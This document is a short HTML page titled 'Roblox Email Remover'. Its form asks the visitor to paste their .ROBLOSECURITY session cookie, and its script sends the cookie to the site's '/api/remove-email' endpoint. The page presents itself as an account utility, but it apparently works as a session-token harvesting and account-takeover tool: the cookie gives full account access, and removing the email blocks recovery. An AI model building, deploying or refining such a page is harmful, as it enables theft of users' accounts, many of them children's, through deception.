<!DOCTYPE html>
<html>
<head>
  <title>Roblox Email Remover</title>
</head>
<body>
  <h2>Remove Email from Roblox</h2>
  <form id="removeForm">
    <label>.ROBLOSECURITY Cookie:</label><br>
    <input type="text" id="cookie" required style="width: 100%;"><br><br>
    <button type="submit">Remove Email</button>
  </form>
  <p id="result"></p>

  <script>
    document.getElementById('removeForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const cookie = document.getElementById('cookie').value;

      const res = await fetch('/api/remove-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie })
      });

      const data = await res.json();
      document.getElementById('result').innerText = data.message || 'Done';
    });
  </script>
</body>
</html>
